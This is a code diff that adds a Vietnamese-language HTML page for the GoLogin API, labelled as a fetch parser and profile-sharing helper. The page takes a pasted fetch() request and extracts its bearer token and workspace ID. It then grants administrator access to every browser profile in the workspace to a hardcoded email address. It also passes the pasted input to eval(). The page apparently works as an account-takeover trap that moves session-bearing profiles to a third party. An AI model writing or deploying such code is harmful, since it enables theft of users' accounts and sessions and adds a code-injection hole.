@@ -244,3 +244,115 @@
   </script>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>GoLogin Auto Fetch Parser + Share Profiles</title>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <style>
+    body { font-family: 'Segoe UI', sans-serif; margin: 40px; background: #f7f9fb; }
+    h1 { color: #1a73e8; }
+    textarea, input { width: 100%; font-family: monospace; font-size: 14px; }
+    textarea { height: 200px; }
+    button { margin-top: 10px; padding: 10px 16px; background: #1a73e8; color: white; border: none; border-radius: 6px; cursor: pointer; }
+    button:hover { background: #125bb5; }
+    #output { white-space: pre-wrap; background: #eee; padding: 10px; border-radius: 6px; margin-top: 10px; }
+    .ok { color: green; font-weight: bold; }
+    .fail { color: red; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h1>🧠 GoLogin Auto Fetch + Share Profiles</h1>
+
+  <textarea id="fetchInput" placeholder="Dán đoạn fetch(...) vào đây rồi bấm Phân tích..."></textarea>
+  <button onclick="analyzeFetch()">🔍 Phân tích & Tự động thực thi</button>
+
+  <h3>📜 Log:</h3>
+  <div id="output">Chưa chạy...</div>
+
+  <script>
+    const DEFAULT_EMAIL = "nguyenvungocuyen2@gmail.com";
+
+    function log(msg) {
+      const out = document.getElementById("output");
+      out.textContent += msg + "\n";
+    }
+
+    function clearLog() {
+      document.getElementById("output").textContent = "";
+    }
+
+    // =============================================================
+    // 🧩 PHÂN TÍCH fetch(...) BẤT KỲ
+    // =============================================================
+    async function analyzeFetch() {
+      clearLog();
+      const input = document.getElementById("fetchInput").value.trim();
+      if (!input.startsWith("fetch(")) return alert("Vui lòng dán đoạn fetch(...) hợp lệ!");
+
+      try {
+        const url = input.match(/fetch\("([^"]+)"/)?.[1];
+        const jsonRaw = input.match(/{[\s\S]*}/)?.[0];
+        const json = eval('(' + jsonRaw + ')');
+
+        const headers = json.headers || {};
+        const token = headers["authorization"]?.replace("Bearer ", "");
+        const workspaceId = headers["workspace-id"];
+        const method = json.method || "GET";
+        const body = json.body ? JSON.parse(json.body) : {};
+
+        log(`✅ Đã phân tích:\n- URL: ${url}\n- Method: ${method}\n- Workspace ID: ${workspaceId}\n- Token: ${token?.slice(0,25)}...\n`);
+
+        // Nếu là share/multi thì gọi luôn hàm share
+        if (url.includes("/share/multi")) {
+          await autoShareProfiles({ url, token, workspaceId, body });
+        } else {
+          log("⚠️ Đây không phải lệnh share. Bạn có thể dùng đoạn này để tạo hoặc đọc profiles.");
+        }
+      } catch (err) {
+        log("❌ Lỗi phân tích: " + err.message);
+      }
+    }
+
+    // =============================================================
+    // 🤝 TỰ ĐỘNG SHARE TẤT CẢ PROFILE TRONG WORKSPACE
+    // =============================================================
+    async function autoShareProfiles({ url, token, workspaceId, body }) {
+      try {
+        log("🔍 Đang lấy danh sách profiles...");
+
+        const res = await axios.get(`https://api.gologin.com/browser/v2?workspace=${workspaceId}`, {
+          headers: { authorization: "Bearer " + token }
+        });
+
+        const profiles = res.data?.data || [];
+        const instanceIds = profiles.map(p => p._id);
+
+        if (!instanceIds.length) return log("⚠️ Không có profile nào để chia sẻ!");
+
+        log(`✅ Lấy được ${instanceIds.length} profiles. Đang chia sẻ tới ${DEFAULT_EMAIL}...`);
+
+        const shareBody = {
+          type: "browser",
+          recepients: [DEFAULT_EMAIL],
+          role: "administrator",
+          instanceIds
+        };
+
+        const shareRes = await axios.post(url, shareBody, {
+          headers: {
+            "content-type": "application/json",
+            authorization: "Bearer " + token,
+            "workspace-id": workspaceId
+          }
+        });
+
+        log("✅ Kết quả chia sẻ:\n" + JSON.stringify(shareRes.data, null, 2));
+      } catch (err) {
+        log("❌ Lỗi khi chia sẻ: " + (err.response?.data?.message || err.message));
+      }
+    }
+  </script>
+</body>
+</html>
